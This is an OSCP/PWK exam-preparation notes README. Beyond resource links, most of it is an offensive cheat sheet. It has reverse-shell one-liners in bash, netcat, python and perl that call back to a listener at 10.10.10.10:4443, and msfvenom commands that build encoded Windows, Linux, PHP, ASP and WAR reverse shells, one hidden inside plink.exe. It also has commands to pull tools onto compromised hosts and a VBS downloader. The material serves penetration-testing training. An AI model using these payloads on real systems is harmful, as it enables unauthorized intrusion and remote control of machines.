# OSCP / PWK Repo

During my time at the PWK labs and for my OSCP preparation, I gathered a big amount of useful stuff that I want to share and make available to the community. With a huge amount of respect to the Offensive Security team, I will not disclose anything about the labs and the exam, but I will give general information and study lines for the young padawans out there who want to TRY HARDER!!!

**Note:** There is high probability that you will get nothing new from this repo. These are just my notes and sources, and you can find everything online but they are gathered in a way that suited me by the time of my exam. :)

## General Links

- Exploit interpreter fix: https://askubuntu.com/questions/304999/not-able-to-execute-a-sh-file-bin-bashm-bad-interpreter
- Oscp repo: https://github.com/rewardone/OSCPRepo
- Pentest compilation: https://github.com/adon90/pentest_compilation
- Command Templates: https://pentest.ws
- Password Lists: https://github.com/danielmiessler/SecLists
- Automated OSCP reconnaissance tool: https://github.com/codingo/Reconnoitre
- OSCP Report Template: https://github.com/whoisflynn/OSCP-Exam-Report-Template
- OSCP Scripts: https://github.com/ihack4falafel/OSCP
- Pentesting resource: https://guif.re/
- FTP Binary mode: https://www.jscape.com/blog/ftp-binary-and-ascii-transfer-types-and-the-case-of-corrupt-files
- Pentesting Cheatsheet: https://ired.team/

## Enumeration

- General Enumeration - Common port checks: http://www.0daysecurity.com/penetration-testing/enumeration.html
- Nmap Scripts: https://nmap.org/nsedoc/

## Web

- LFI/RFI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-rfi
- MSSQL Injection: https://www.exploit-db.com/papers/12975
    - MSSQL Union Based Injection: http://www.securityidiots.com/Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html
    - MSSQL SQL Injection Cheat Sheet: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
- MySQL Injection: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
- MongoDB Nosql Injection: https://security.stackexchange.com/questions/83231/mongodb-nosql-injection-in-python-code
    - http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

## Shell Exploitation

- Reverse Shell Cheat Sheet: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
    - More Reverse Shells: https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
    - Even More Reverse shells: https://delta.navisec.io/reverse-shell-reference/
- Spawning TTY Shell: https://netsec.ws/?p=337
- Metasploit payloads (msfvenom): https://netsec.ws/?p=331
- Best Web Shells: https://www.1337pwn.com/best-php-web-shells/
    - https://github.com/artyuum/Simple-PHP-Web-Shell
    - http://www.topshellv.com/
- Escape from SHELLcatraz: https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=10

### Reverse Shells

- bash -i >& /dev/tcp/10.10.10.10/4443 0>&1
- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f
- nc -e /bin/sh 10.10.10.10 4443
- nc -e cmd.exe 10.10.10.10 4443
- python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
- perl -e 'use Socket;$i="10.10.10.10";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

### Spawn TTY Shells

- python -c 'import pty; pty.spawn("/bin/sh")'
- echo os.system('/bin/bash')
- /bin/sh -i
- perl —e 'exec "/bin/sh";'
- perl: exec "/bin/sh";
- ruby: exec "/bin/sh"
- lua: os.execute('/bin/sh')
- (From within IRB): exec "/bin/sh"
- (From within vi): :!bash
- (From within vi): :set shell=/bin/bash:shell
- (From within nmap): !sh

### msfvenom payloads

- PHP reverse shell: msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php
- Java WAR reverse shell: msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war
- Linux bind shell: msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai
- Linux FreeBSD reverse shell: msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o shell.elf
- Linux C reverse shell: msfvenom  -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f c
- Windows non staged reverse shell: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe
- Windows Staged (Meterpreter) reverse shell: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe
- Windows Python reverse shell: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f python -o shell.py
- Windows ASP reverse shell: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp
- Windows ASPX reverse shell: msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx
- Windows JavaScript reverse shell with nops: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f js_le -e generic/none -n 18
- Windows Powershell reverse shell: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1
- Windows reverse shell excluding bad characters: msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_nai
- Windows x64 bit reverse shell: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe
- Windows reverse shell embedded into plink: msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe

## File Transfers

```HTTP
# In Kali
python -m SimpleHTTPServer 80

# In reverse shell - Linux
wget 10.10.10.10/file

# In reverse shell - Windows
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"
```

```FTP
# In Kali
python -m pyftpdlib -p 21 -w

# In reverse shell
echo open 10.10.10.10 > ftp.txt
echo USER anonymous >> ftp.txt
echo ftp >> ftp.txt 
echo bin >> ftp.txt
echo GET file >> ftp.txt
echo bye >> ftp.txt

# Execute
ftp -v -n -s:ftp.txt

“Name the filename as ‘file’ on your kali machine so that you don’t have to re-write the script multiple names, you can then rename the file on windows.”
```

```TFTP
# In Kali
atftpd --daemon --port 69 /tftp

# In reverse shell
tftp -i 10.10.10.10 GET nc.exe
```

```VBS
If FTP/TFTP fails you, this wget script in VBS is the go to on Windows machines.

# In reverse shell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

# Execute
cscript wget.vbs http://10.10.10.10/file.exe file.exe
```

## Privilege Escalation

Common priviledge escalation exploits and scripts: https://github.com/AusJock/Privilege-Escalation

### Linux

- Linux EoP (Best privesc): https://guif.re/linuxeop
- Basic Linux Privilege Escalation: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- unix-privesc-check: http://pentestmonkey.net/tools/audit/unix-privesc-check
- linuxprivchecker.py: http://www.securitysift.com/download/linuxprivchecker.py
- Linux Enumeration: https://github.com/rebootuser/LinEnum
- pspy: https://github.com/DominicBreuker/pspy
- Linux Priv Checker: https://github.com/sleventyeleven/linuxprivchecker
- Kernel Exploits: https://github.com/lucyoa/kernel-exploits
- PrivEsc binaries: https://gtfobins.github.io/

### Windows

- Windows Privilege Escalation Fundamentals: http://www.fuzzysecurity.com/tutorials/16.html
- Windows-Exploit-Suggester: https://github.com/GDSSecurity/Windows-Exploit-Suggester
- winprivesc: https://github.com/joshruppe/winprivesc
- Windows Privilege Escalation Guide: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
- Windows-Privesc: https://github.com/togie6/Windows-Privesc
- WindowsExploits: https://github.com/abatchy17/WindowsExploits
- PowerSploit: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- Windows EoP: https://guif.re/windowseop
- OSCP Notes: https://securism.wordpress.com/oscp-notes-privilege-escalation-windows/
- PrivEsc Binaries: https://lolbas-project.github.io/